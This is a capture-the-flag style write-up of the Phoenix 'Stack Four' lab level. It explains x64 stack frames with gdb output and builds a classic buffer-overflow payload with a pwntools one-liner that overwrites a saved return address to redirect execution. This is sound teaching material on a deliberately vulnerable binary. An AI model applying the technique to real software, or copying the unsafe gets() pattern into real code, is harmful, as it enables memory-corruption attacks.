## Stack Four
Stack Four takes a look at what can happen when you can overwrite the saved instruction pointer (standard buffer overflow).

 * saved return address, and pointing it to the complete_level() function.

  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

## Challenge
The aim is to execute the function `complete_level()` by modifying the saved return address, and pointing it to the `complete_level()` function.

## Solution
A perfect example for a classic stack-smashing.

### The Plan
Another `gets()` overflow, only this time we will overwrite `start_level()`'s return address (on the stack) in order to redirect execution to `complete_level()`.

Don't worry if you don't understand what that means yet, we will debug our way through writing the exploit and understanding the concepts.

### Debugging
```console
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-four
```
```console
(gdb) info functions

(gdb) b main

```
Notice `complete_level()`'s address is `0x000000000040061d`, this is the address we want `start_level()` to return to.

`*main+30` is where `start_level()` is called, thus it will return to `*main+35` (the next instruction in `main()`)
> When a `call` instruction is executed, the address of the following instruction is
pushed onto the stack as the return address and control passes to the specified function.

#### About Stacks And Frames
> An x64 program uses a region of memory called the stack to support function calls. As the name
suggests, this region is organized as a stack data structure with the ‚Äútop‚Äù of the stack growing
towards lower memory addresses. For each function call, new space is created on the stack to
store local variables and other data. This is known as a *stack frame*. To accomplish this, you will
need to write some code at the beginning and end of each function to create and destroy the
stack frame.

```nasm
0x400635 <start_level+0>  push   rbp
0x400636 <start_level+1>  mov    rbp, rsp
0x400639 <start_level+4>  sub    rsp, 0x50
```
These instructions are known as the *function prologue*, and they prepare the *stack frame* for `start_level()`.
1. Push `rbp` (*base pointer*, responsible for keeping track of the current function's stack frame) to the stack, in order to be able to recover the caller's stack frame when the function returns
2. Move `rsp` (*stack pointer*, points to the top item in the stack) to `rbp`, this defines the new stack frame's start
3. Subtract a number of bytes from `rsp`, reserves place on the stack for the function's local variables

We also have a *function epilogue*,
```nasm
0x400668 <start_level+51>  leave
0x400669 <start_level+52>  ret
```
> The `leave` instruction sets `rsp` to `rbp` and pops the top of the stack into `rbp`

> The `ret` instruction pops the return address from the stack and jumps there
1. Move `rbp` to `rsp`, recover stack pointer to the previous location (caller stack frame), before subtraction
2. Pop top item in the stack to `rbp`, restore caller's stack frame base
3. Pop the address function returns to from the stack
4. Jump to the address (thus returning)

#### Back To Debugging
After stepping through the function prolouge,
```nasm
     0x400637 <start_level+2>  mov    ebp, esp
     0x400639 <start_level+4>  sub    rsp, 0x50
 ‚Üí   0x40063d <start_level+8>  lea    rax, [rbp-0x50]
     0x400641 <start_level+12> mov    rdi, rax
     0x400644 <start_level+15> call   0x400470 <gets@plt>
     0x400649 <start_level+20> mov    rax, QWORD PTR [rbp+0x8]
     0x40064d <start_level+24> mov    QWORD PTR [rbp-0x8], rax
```
![](/images/stack-4/0.png)

We can identify:
* üü† `rbp-0x50` - `buffer` being passed to `gets()`
* üî¥ `rbp` - base pointer points to the caller's base pointer (pushed to stack during prelouge)
* üîµ `rbp+0x8` - return address (what we want to overwrite), pushed to stack during `call start_level`, thus outside of current stack frame
* üü¢ `rbp-0x8` - `ret` the pointer that get's the return address through `__builtin_return_address(0)`
* üü£ `rbp-0x10` - padding added by compiler

### Breaking It
* üü†üü£üü¢ overwrite the `0x50` (80) bytes allocated to the local variables with junk
* üî¥ overwrite `rbp` with it's value
* üîµ overwrite the return address with `0x000000000040061d` (the address of `complete_level()`)

Get `rbp`'s value:
```console
(gdb) dereference $rbp
0x00007fffffffe670‚îÇ+0x0000: 0x00007fffffffe690  ‚Üí  0x0000000000000001    ‚Üê $rbp
```

We can use `pwntools`' `p64()` to pack a 64bit little-endian integer.

```console
user@phoenix-amd64:~$ python -c "from pwn import p64; f=open('smash', 'wb'); f.write('a'*0x50+p64(0x00007fffffffe690)+p64(0x000000000040061d))"
user@phoenix-amd64:~$ hexdump -C smash
00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
